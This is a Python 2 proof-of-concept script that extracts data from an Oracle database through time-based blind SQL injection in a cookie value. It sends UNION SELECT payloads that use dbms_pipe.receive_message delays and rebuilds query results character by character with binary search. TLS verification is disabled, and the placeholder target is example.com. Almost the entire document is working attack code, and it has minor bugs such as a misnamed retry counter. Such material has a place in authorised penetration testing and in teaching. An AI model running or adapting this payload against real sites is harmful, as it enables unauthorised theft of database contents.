################################################################################################
#  Description:  
#  A rough HTTP GET based POC for dumping results from an Oracle database using time based
#  SQL injection in a cookie variable.
#
#  Author: b0yd
#
################################################################################################

import requests
import urllib
import time
import math
import sys

proxies = None
#Comment out if not using a proxy like Burp, etc
#proxies = {
#  'http': 'http://127.0.0.1:8080',
#  'https': 'http://127.0.0.1:8080',
#}

# if len(sys.argv) < 2:
  # print "Usage: python oracle_sqli_time_based.py <SQL Query>"
  # sys.exit(1)
  
# query = sys.argv[1]

#Example User Agent string
headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'}
           
#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

#Set this to the parameter name for the POST request
vuln_param_name = "param1"
timeout = 5

#Target URL
url = "https://example.com/vulnerable_page.html"

#Set this to the beginning ascii ordinal value
begin_num = 32
#Set this to the end ascii ordinal value
end_num = 127

#Used to find the length of the returned SQL string
def get_str_length(query, start_ord, end_ord):

  s = start_ord
  e = end_ord 
  res_len = 0
  mid = 0
  
  #Update mid point
  while True:
    diff = e - s
    if s == end_ord:
      print "[-] Length not found. Exiting"
      res_len = 0
      break
    elif diff == 0:
      res_len = s
      break
          
    #Set mid point 
    mid = int(math.floor(diff/2)) + s    
    print "[+] Current ret query length: %d" % mid
  
    # The target table has 2 columns
    data = "1 union select '',(CASE WHEN ( length((%s)) > %d ) THEN CHR((dbms_pipe.receive_message (CHR(118)||CHR(106)||CHR(88)||CHR(84), %d))) ELSE CHR(1) END) from dual--" % (query, mid, timeout)
    ret_tuple = make_request(url, data)	  
      
    #Print elapsed time
    req_time = ret_tuple[1]
    print req_time   

    #Query succeeded
    if req_time > timeout - 1:
      #Move the range past the mid point
      s = mid + 1        
    #elif "error" in ret_tuple[0]:
    #  print "[-] SQL syntax error"
    #  break
    else:   
      #Move the range past to mid point
      e = mid

  return res_len


def make_request( addr, data ):      
        
  # data
  enc_data = urllib.urlencode({vuln_param_name: data})
  headers["Cookie"] = enc_data
  
  #Setup request
  count = 3
  while count > 0:
    try:
      r = requests.get(addr, proxies=proxies, verify=False, headers=headers)
      break
    except:
      counter -= 1
      time.sleep(5)
      continue
      
  req_time = (r.elapsed.total_seconds())
  return r.text,req_time

  
def get_string(str_len, query, start_ord, end_ord):

  full_str = ''
  counter = 1
  while( len(full_str) < str_len ):

    s = start_ord
    e = end_ord 
    letter_found = False
    mid = 0
    
    while True:
    
      #Update mid point
      diff = e - s
      if s == end_ord:
        print "[-] Letter not found. Exiting"
        break
      elif diff == 0:
        full_str += chr(s)
        counter += 1
        letter_found = True
        break  
      
      #Set mid point 
      mid = int(math.floor(diff/2)) + s    
      print "[+] Current ASCII char: %d" % mid
      if mid == start_ord:
        print "[-] Letter not found. Exiting"
        break
      
      # The target table has 2 columns
      data = "1 union select '',(CASE WHEN ( (ascii(substr((%s),%s,1))) > %d ) THEN CHR((dbms_pipe.receive_message (CHR(118)||CHR(106)||CHR(88)||CHR(84), %d))) ELSE CHR(1) END) from dual--" % (query, counter, mid, timeout)
      ret_tuple = make_request(url, data)	  
      
      #Print elapsed time
      req_time = ret_tuple[1]
      #print req_time   

      #Query succeeded
      if req_time > timeout - 1:
        #Move the range past the mid point
        s = mid + 1     
        print("[+] True case: %d seconds" % req_time)        
      # elif "error" in ret_tuple[0]:
        # print "[-] SQL syntax error"
        # break
      else:   
        #Move the range past to mid point
        e = mid
        print("[+] False case: %d seconds" % req_time) 
		
    print full_str
    #sys.exit(1)


    if letter_found == False:
      print "[-] Letter not found. Exiting"
      break

  return full_str
  
  

#SQL query to execute
query = "select user from dual"

#Print the query
print "[+] Running query: '%s'" % query

stime = time.time()

#Get result string length
str_len = get_str_length(query, 0, 100)

print "[+] Length: %d" % str_len
if str_len > 0:
    user = get_string(str_len, query, begin_num, end_num)
    etime = time.time()
    print "[+] Result: %s" % user
    print "[+] Total Time: %d seconds" % (etime-stime)
    
 